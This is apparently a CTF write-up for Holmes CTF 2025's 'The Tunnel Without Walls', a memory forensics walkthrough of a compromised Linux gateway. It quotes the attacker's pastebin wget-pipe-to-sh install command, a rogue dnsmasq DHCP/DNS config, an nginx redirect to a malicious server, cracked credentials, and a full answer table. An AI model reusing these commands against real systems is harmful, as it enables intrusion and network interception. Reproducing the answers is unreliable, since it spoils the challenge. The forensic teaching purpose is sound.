# Holmes CTF 2025 - The Tunnel Without Walls

## Challenge Information

**Challenge Name:** The Tunnel Without Walls  
**Difficulty:** Hard  
**Category:** Memory Forensics / Linux Forensics  
**Event:** Holmes CTF 2025 - HackTheBox's First All-Blue CTF

## Description

A memory dump from a connected Linux machine reveals covert network connections, fake services, and unusual redirects. Holmes investigates further to uncover how the attacker is manipulating the entire network!

## Artifacts Provided

- `The_Tunnel_Without_Walls.zip` containing:
  - `memdump.mem`

---

## Table of Contents

- [Tools Used](#tools-used)
- [Setting Up Volatility 3 on Windows 10](#setting-up-volatility-3-on-windows-10)
- [Walkthrough](#walkthrough)
  - [Initial Reconnaissance](#initial-reconnaissance)
  - [Question 1: Linux Kernel Version](#question-1-linux-kernel-version)
  - [Question 2: Initial SSH Shell PID](#question-2-initial-ssh-shell-pid)
  - [Question 3: Privilege Escalation Credentials](#question-3-privilege-escalation-credentials)
  - [Question 4: Malicious Rootkit Path](#question-4-malicious-rootkit-path)
  - [Question 5: Rootkit Author Email](#question-5-rootkit-author-email)
  - [Question 6: DNS Manipulation Package](#question-6-dns-manipulation-package)
  - [Question 7: Compromised Workstation](#question-7-compromised-workstation)
  - [Question 8: Portal Username](#question-8-portal-username)
  - [Question 9: Supply Chain Attack Endpoint](#question-9-supply-chain-attack-endpoint)
  - [Question 10: Domain Redirection Details](#question-10-domain-redirection-details)
- [Key Techniques Learned](#key-techniques-learned)
- [Final Thoughts](#final-thoughts)
- [Answer Summary](#answer-summary)

---

## Tools Used

- **Volatility 3** - Memory forensics framework
- **Strings (Sysinternals)** - Extract printable strings from binary files
- **Notepad++** - Text analysis and searching
- **John the Ripper** - Password hash cracking
- **rockyou.txt** - Password wordlist

---

## Setting Up Volatility 3 on Windows 10

### Prerequisites Installation

#### 1. Install Python

1. Visit https://www.python.org/downloads/
2. Download the latest version for Windows
3. Run the installer (ensure "Add Python to PATH" is checked)

#### 2. Install Visual C++ Build Tools

1. Go to https://visualstudio.microsoft.com/visual-cpp-build-tools/
2. Download and run the installer
3. Select "Desktop development with C++" workload

#### 3. Install Git (if not already installed)

1. Visit https://git-scm.com/downloads
2. Download Windows version
3. Run the executable and follow the wizard

### Installing Volatility 3

```cmd
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3/
python -m venv venv
venv\Scripts\activate.bat
pip install -e ".[dev]"
```

### Installing Additional Tools

#### Strings (Sysinternals)

1. Visit https://learn.microsoft.com/en-us/sysinternals/downloads/strings
2. Click "Download Strings"
3. Unzip and copy `strings.exe` to `C:\Windows\System32\`

#### Notepad++

1. Visit https://notepad-plus-plus.org/downloads/
2. Download the latest version
3. Follow installer instructions

#### John the Ripper

1. Visit https://www.openwall.com/john/
2. Download: 1.9.0-jumbo-1 64-bit Windows binaries
3. Unzip to a permanent location (e.g., `C:\JohnTheRipper\`)

---

## Walkthrough

### Initial Reconnaissance

Before diving into specific questions, I established a methodology combining Volatility 3 plugins with string extraction for comprehensive analysis.

**Why This Hybrid Approach?**

Memory forensics often requires multiple techniques because:
- Volatility plugins provide structured data (processes, bash history)
- String extraction reveals evidence that may not be in active process memory
- Symbol issues can limit plugin effectiveness
- Combined analysis provides redundancy and validation

### Question 1: Linux Kernel Version

**Task:** What is the Linux kernel version of the provided image?

**Solution:**

I started with Volatility's `banners` plugin to extract kernel version information:

```cmd
(venv) C:\volatility3>python vol.py -f C:\Users\Utilisateur\Desktop\The_Tunnel_Without_Walls\memdump.mem banners
```

Output:
```
Offset      Banner
0x67200200  Linux version 5.10.0-35-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.237-1 (2025-05-19)
```

**Why the `banners` Plugin?**

The Linux kernel stores its version string (banner) in multiple memory locations. This banner contains:
- Kernel version and architecture
- Compiler information
- Build date and distribution details

This is the most reliable way to identify the exact kernel version from a memory dump.

**Flag:** `5.10.0-35-amd64`

---

### Question 2: Initial SSH Shell PID

**Task:** The attacker connected over SSH and executed initial reconnaissance commands. What is the PID of the shell they used?

**Solution:**

I used the `linux.bash.Bash` plugin to extract bash command history with timestamps and PIDs:

```cmd
(venv) C:\volatility3>python vol.py --remote-isf-url "https://github.com/Abyss-W4tcher/volatility3-symbols/raw/master/banners/banners.json" -f C:\Users\Utilisateur\Desktop\The_Tunnel_Without_Walls\memdump.mem linux.bash.Bash
```

Key entries showing initial reconnaissance:
```
PID     Process CommandTime                     Command
13608   bash    2025-09-03 08:16:48.000000 UTC  id
13608   bash    2025-09-03 08:16:52.000000 UTC  cat /etc/os-release
13608   bash    2025-09-03 08:16:58.000000 UTC  uname -a
13608   bash    2025-09-03 08:17:02.000000 UTC  ip a
13608   bash    2025-09-03 08:17:04.000000 UTC  ps aux
```

**Analysis:**

PID 13608 executed classic reconnaissance commands:
- `id` - Check current user privileges
- `cat /etc/os-release` - Identify OS version
- `uname -a` - Kernel information
- `ip a` - Network configuration
- `ps aux` - Running processes

This is textbook attacker enumeration behavior.

**Why Bash History is Forensic Gold:**

Bash history in memory reveals:
- The exact sequence of attacker commands
- Timestamps of execution
- Parent-child process relationships
- Commands even if `.bash_history` was deleted from disk

**Flag:** `13608`

---

### Question 3: Privilege Escalation Credentials

**Task:** After the initial information gathering, the attacker authenticated as a different user to escalate privileges. Identify and submit that user's credentials.

**Solution:**

Continuing from the bash history, I observed a privilege escalation attempt:

```
PID     Process CommandTime                     Command
13608   bash    2025-09-03 08:18:11.000000 UTC  su jm
22714   bash    2025-09-03 08:18:15.000000 UTC  poweroff
22714   bash    2025-09-03 08:18:31.000000 UTC  id
```

The attacker switched from the original user to `jm`, spawning a new bash session (PID 22714). To find the password, I extracted all strings from the memory dump:

```cmd
C:\Users\Utilisateur\Desktop\The_Tunnel_Without_Walls>strings64 memdump.mem > strings.txt
```

Searching for `jm:` in the strings file with Notepad++, I found:

```
werni:x:1000:1000:werni,,,:/home/werni:/bin/bash
jm:$1$jm$poAH2RyJp8ZllyUvIkxxd0:0:0:root:/root:/bin/bash
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

This is a shadow file entry showing:
- Username: `jm`
- Hash: `$1$jm$poAH2RyJp8ZllyUvIkxxd0`
- Hash type: `$1$` = MD5-crypt
- Salt: `jm`

**Cracking the Hash with John the Ripper:**

```cmd
C:\JohnTheRipper\run>echo $1$jm$poAH2RyJp8ZllyUvIkxxd0 > hash.txt
C:\JohnTheRipper\run>john --format=md5crypt --wordlist=rockyou.txt hash.txt
```

Result:
```
WATSON0          (?)
1g 0:00:00:26 DONE (2025-10-03 23:17)
```

**Why This Approach Worked:**

Memory dumps often contain sensitive data that should never be in RAM, including:
- Cached password hashes
- Plaintext credentials
- Authentication tokens
- Encryption keys

The `/etc/shadow` file contents were likely read by the attacker or cached by the system.

**Flag:** `jm:WATSON0`

---

### Question 5: Rootkit Author Email

**Task:** What is the email account of the alleged author of the malicious file?

**Note:** I'm addressing Q5 before Q4 because finding the email provides context for locating the rootkit.

**Solution:**

To find the rootkit author, I created a Python script to extract all email addresses from the strings file:

```python
import re
import sys

def extract_emails(input_file, output_file=None):
    """
    Extract all valid email addresses from a file.
    
    Args:
        input_file: Path to the input file to read
        output_file: Optional path to save extracted emails (prints to console if not provided)
    """
    # Email regex pattern
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    
    try:
        # Read the input file
        with open(input_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Find all email addresses
        emails = re.findall(email_pattern, content)
        
        # Remove duplicates while preserving order
        unique_emails = list(dict.fromkeys(emails))
        
        print(f"Found {len(unique_emails)} unique email(s):")
        
        # Output results
        if output_file:
            with open(output_file, 'w', encoding='utf-8') as f:
                for email in unique_emails:
                    f.write(email + '\n')
            print(f"Emails saved to: {output_file}")
        else:
            for email in unique_emails:
                print(email)
        
        return unique_emails
    
    except FileNotFoundError:
        print(f"Error: File '{input_file}' not found.")
        return []
    except Exception as e:
        print(f"Error: {e}")
        return []

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python email_extractor.py <input_file> [output_file]")
        print("Example: python email_extractor.py data.txt emails.txt")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else None
    
    extract_emails(input_file, output_file)
```

Running the script:
```cmd
C:\Users\Utilisateur\Desktop\The_Tunnel_Without_Walls>python email_extractor.py strings.txt emails.txt
Found 1695 unique email(s)
```

I then filtered out legitimate domains using PowerShell:

```powershell
Get-Content emails.txt | Where-Object {
    $_ -match '@' -and
    $_ -notmatch '\.(service|target|gz|dpkg|java|pub|catalog|journal|utf)' -and
    $_ -notmatch '^[0-9@\-]' -and
    $_ -notmatch '@(openssh|libssh|github|containerd)' -and
    $_ -notmatch '\.(com|org|net|edu|gov|io|de|fr|uk|cn|tw|jp|ru|cz|fi|nl|ch|at|br|ca|mx|au|nz|se|no|dk|pl|it|es|be|gr|il|name|mil|ar|za|nu|email|me|hu|by|info|cx|id|ag|eu|si|ua|kr|li|in|ie|us|hk|pt|su|bg|sk|cat)$' -and
    $_ -notmatch '@.*(lists\.|debian|alpine|sourceforge|vger\.|kernel|maths\.|university|uab\.|ucd\.)' -and
    $_ -match '@'
} | Sort-Object -Unique
```

Results:
```
f@javax.management.remote.JMXConnectorProvider
fossdd@pwned.life
g.toth@e-biz.lu
g@b4.vu
i-am-the@network.now
jhi@hut.fiE
mrc@bourne.st
Nz@Counter.fromkeys
O@com.sun.media.sound.UlawCodec
oliver@8.c.9.b.0.7.4.0.1.0.0.2.ip6.arpa
solt@dns.toxicfilms.tv
user@1000.servic
x@s.XK
z@D.setdefault
```

The most suspicious: **`i-am-the@network.now`** (`.now` TLD doesn't exist)

Searching for this email in `strings.txt` revealed:

```
PARASITE_HB
PARASITE_CMD
PARASITE_RSHELL
PARASITE_SHOW
PARASITE_HIDE
description=NULLINC REVENGE IS COMING...
license=GPL
author=i-am-the@network.now
depends=
retpoline=Y
name=Nullincrevenge
vermagic=5.10.0-35-amd64 SMP mod_unload modversions
```

This is kernel module metadata showing:
- **Module name:** Nullincrevenge
- **Author:** i-am-the@network.now
- **Description:** NULLINC REVENGE IS COMING...
- **Functions:** PARASITE_* (rootkit functionality)

**Flag:** `i-am-the@network.now`

---

### Question 4: Malicious Rootkit Path

**Task:** The attacker downloaded and executed code from Pastebin to install a rootkit. What is the full path of the malicious file?

**Solution:**

From the bash history (PID 22714), I found the rootkit installation command:

```
22714   bash    2025-09-03 08:18:40.000000 UTC  wget -q -O- https://pastebin.com/raw/hPEBtinX|sh
```

The attacker downloaded and executed a script from Pastebin that installed the rootkit. From Question 5, I knew the module name was `Nullincrevenge.ko`, but I needed the full path.

Searching `strings.txt` for "Nullincrevenge" only revealed partial paths. To find the complete path, I used Volatility's `linux.pagecache.File` plugin to examine cached file metadata:

```cmd
(venv) C:\volatility3>set PYTHONIOENCODING=utf-8
(venv) C:\volatility3>python vol.py -f C:\Users\Utilisateur\Desktop\The_Tunnel_Without_Walls\memdump.mem linux.pagecache.File > cache.txt
```

Searching for "Nullincrevenge" in the cache output:

```
0x9b33882a9000  /  8:1  298762  0x9b3386454a80  REG  135  39  -rw-r--r--  
2025-09-03 08:18:44.155080 UTC  2025-09-03 08:18:40.799070 UTC  
/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko
```

**Why Page Cache Analysis?**

The page cache stores recently accessed files in memory for performance. Even if a file isn't in an active process, its metadata persists in the cache, making it valuable for:
- Finding deleted or hidden files
- Recovering full file paths
- Establishing file access timelines

**Flag:** `/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko`

---

### Question 6: DNS Manipulation Package

**Task:** The next step in the attack involved issuing commands to modify the network settings and installing a new package. What is the name and PID of the package?

**Solution:**

From the bash history, I identified the package installation:

```
22714   bash    2025-09-03 08:20:15.000000 UTC  iptables -A FORWARD -i ens224 -o ens192 -j ACCEPT
22714   bash    2025-09-03 08:20:15.000000 UTC  iptables -A FORWARD -i ens192 -o ens224 -m state --state ESTABLISHED,RELATED -j ACCEPT
22714   bash    2025-09-03 08:20:16.000000 UTC  iptables -t nat -A POSTROUTING -s 192.168.211.0/24 -o ens192 -j MASQUERADE
22714   bash    2025-09-03 08:20:31.000000 UTC  apt install -y dnsmasq
22714   bash    2025-09-03 08:20:50.000000 UTC  rm /etc/dnsmasq.conf
22714   bash    2025-09-03 08:20:56.000000 UTC  nano /etc/dnsmasq.conf
22714   bash    2025-09-03 08:21:23.000000 UTC  systemctl enable --now dnsmasq
22714   bash    2025-09-03 08:21:30.000000 UTC  systemctl restart dnsmasq
```

The package is **dnsmasq** (a lightweight DNS and DHCP server). To find the PID, I used `linux.pslist`:

```cmd
(venv) C:\volatility3>python vol.py -f C:\Users\Utilisateur\Desktop\The_Tunnel_Without_Walls\memdump.mem linux.pslist
```

Relevant excerpt:
```
OFFSET (V)      PID     TID     PPID    COMM    CREATION TIME
0x9b32812d6000  38687   38687   1       dnsmasq 2025-09-03 08:21:30.379503 UTC
```

**Attack Context:**

The attacker:
1. Configured IP forwarding with iptables (making the system a router)
2. Installed dnsmasq for DNS manipulation
3. Configured dnsmasq to intercept and redirect DNS queries
4. Enabled the service for persistence

This setup allows the attacker to perform man-in-the-middle attacks by:
- Intercepting DNS requests
- Redirecting victims to malicious servers
- Maintaining network-wide control

**Flag:** `dnsmasq,38687`

---

### Question 7: Compromised Workstation

**Task:** Clearly, the attacker's goal is to impersonate the entire network. One workstation was already tricked and got its new malicious network configuration. What is the workstation's hostname?

**Solution:**

Searching for "CogWork-1" in `strings.txt` (referenced in the question), I found the dnsmasq configuration:

```
interface=ens224
dhcp-range=192.168.211.30,192.168.211.240,1h
dhcp-option=3,192.168.211.8
dhcp-option=6,192.168.211.8
no-hosts
no-resolv
server=8.8.8.8
address=/updates.cogwork-1.net/192.168.211.8
log-queries=no
quiet-dhcp
quiet-dhcp6
log-facility=/dev/null
```

Further down, I found DHCP lease information:

```
1756891471 00:50:56:b4:32:cd 192.168.211.52 Parallax-5-WS-3 01:00:50:56:b4:32:cd
```

This shows:
- **Hostname:** Parallax-5-WS-3
- **IP Address:** 192.168.211.52
- **MAC Address:** 00:50:56:b4:32:cd
- **Lease timestamp:** 1756891471

**What Happened:**

The attacker configured dnsmasq to:
- Serve as DHCP server for the 192.168.211.0/24 network
- Set itself (192.168.211.8) as the default gateway and DNS server
- Redirect `updates.cogwork-1.net` to the malicious server
- The workstation "Parallax-5-WS-3" received this poisoned configuration

**Flag:** `Parallax-5-WS-3`

---

### Question 8: Portal Username

**Task:** After receiving the new malicious network configuration, the user accessed the City of CogWork-1 internal portal from this workstation. What is their username?

**Solution:**

Searching for "POST /" in `strings.txt` to find authentication requests:

```
POST /index.php HTTP/1.1
Host: 10.129.232.25:8081
Connection: keep-alive
Content-Length: 43
Cache-Control: max-age=0
Origin: http://10.129.232.25:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.232.25:8081/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=189b027ab0e5e10f496e57953544cd74

username=mike.sullivan&password=Pizzaaa1%21
```

**Analysis:**

The POST request reveals:
- **Username:** mike.sullivan
- **Password:** Pizzaaa1! (URL-decoded from `Pizzaaa1%21`)
- **Target:** Internal portal at 10.129.232.25:8081

This traffic was captured because the malicious DNS server redirected the user through the attacker's infrastructure, allowing packet capture.

**Flag:** `mike.sullivan`

---

### Question 9: Supply Chain Attack Endpoint

**Task:** Finally, the user updated a software to the latest version, as suggested on the internal portal, and fell victim to a supply chain attack. From which Web endpoint was the update downloaded?

**Solution:**

From the same section in `strings.txt`, I found the malicious update request:

```
GET /win10/update/CogSoftware/AetherDesk-v74-77.exe HTTP/1.1
Host: updates.cogwork-1.net
Accept: */*
User-Agent: AetherDesk/73.0 (Windows NT 10.0; Win64; x64)
```

**Supply Chain Attack Flow:**

1. User trusts the internal portal recommendation
2. Attempts to download update from `updates.cogwork-1.net`
3. Malicious DNS server redirects to attacker's infrastructure
4. User downloads trojanized software thinking it's legitimate

**Flag:** `/win10/update/CogSoftware/AetherDesk-v74-77.exe`

---

### Question 10: Domain Redirection Details

**Task:** To perform this attack, the attacker redirected the original update domain to a malicious one. Identify the original domain and the final redirect IP address and port.

**Solution:**

From the dnsmasq configuration found earlier:

```
address=/updates.cogwork-1.net/192.168.211.8
```

And the nginx reverse proxy configuration:

```
server {
    listen 80;
    location / {
        proxy_pass http://13.62.49.86:7477/;
        proxy_set_header Host jm_supply;
    }
}
```

**Attack Infrastructure:**

1. **Original domain:** updates.cogwork-1.net (legitimate update server)
2. **DNS poisoning:** Points to 192.168.211.8 (attacker's machine)
3. **Reverse proxy:** Forwards to 13.62.49.86:7477 (actual malicious server)

The attacker created a sophisticated man-in-the-middle infrastructure:
- DNS server redirects victims to the compromised Linux machine
- Nginx proxy forwards requests to the actual malicious server
- Maintains stealth by using a proxy chain

**Flag:** `updates.cogwork-1.net,13.62.49.86:7477`

---

## Key Techniques Learned

### Memory Forensics Methodology
- **Hybrid analysis:** Combining Volatility plugins with raw string extraction
- **Plugin selection:** Choosing the right tool for specific evidence (bash history, process list, page cache)
- **Symbol challenges:** Working around plugin limitations with alternative approaches

### Linux Rootkit Analysis
- **Kernel module identification:** Finding loaded modules and their metadata
- **LKM persistence:** Understanding how attackers use legitimate kernel features maliciously
- **Author attribution:** Extracting embedded metadata from kernel modules

### Network Infrastructure Attacks
- **DNS poisoning:** Manipulating DNS responses to redirect traffic
- **DHCP poisoning:** Distributing malicious network configurations
- **Reverse proxy chains:** Using legitimate tools (nginx) for malicious redirection
- **Supply chain attacks:** Leveraging trust in update mechanisms

### Hash Cracking and Credential Recovery
- **Shadow file format:** Understanding Unix password storage
- **Hash identification:** Recognizing hash types from format (`$1$` = MD5-crypt)
- **John the Ripper:** Practical password cracking workflows

### String Analysis and Filtering
- **Extraction:** Using Sysinternals Strings for comprehensive text recovery
- **Pattern matching:** Regex for email extraction and filtering
- **PowerShell filtering:** Advanced text processing for large datasets

---

## Final Thoughts

This challenge lived up to its "Hard" rating. The combination of:
- Volatility 3 symbol issues requiring alternative approaches
- Multi-layered attack infrastructure analysis
- Creative use of string extraction and filtering
- Multiple forensic disciplines (memory, network, credential analysis)

Made it the most complex challenges in Holmes CTF 2025.

**Key Takeaway:**

When primary forensic tools encounter limitations (as Volatility sometimes did with symbols), pivot to complementary techniques. The hybrid approach of structured analysis (Volatility) + unstructured analysis (strings) proved more effective than relying on either alone.

The challenge excellently demonstrated a real-world scenario: an attacker compromising a network gateway, installing a rootkit for persistence, and using DNS/DHCP poisoning to perform supply chain attacks against internal users.

---

## Answer Summary

| Question | Answer |
|----------|--------|
| Q1 | `5.10.0-35-amd64` |
| Q2 | `13608` |
| Q3 | `jm:WATSON0` |
| Q4 | `/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko` |
| Q5 | `i-am-the@network.now` |
| Q6 | `dnsmasq,38687` |
| Q7 | `Parallax-5-WS-3` |
| Q8 | `mike.sullivan` |
| Q9 | `/win10/update/CogSoftware/AetherDesk-v74-77.exe` |
| Q10 | `updates.cogwork-1.net,13.62.49.86:7477` |
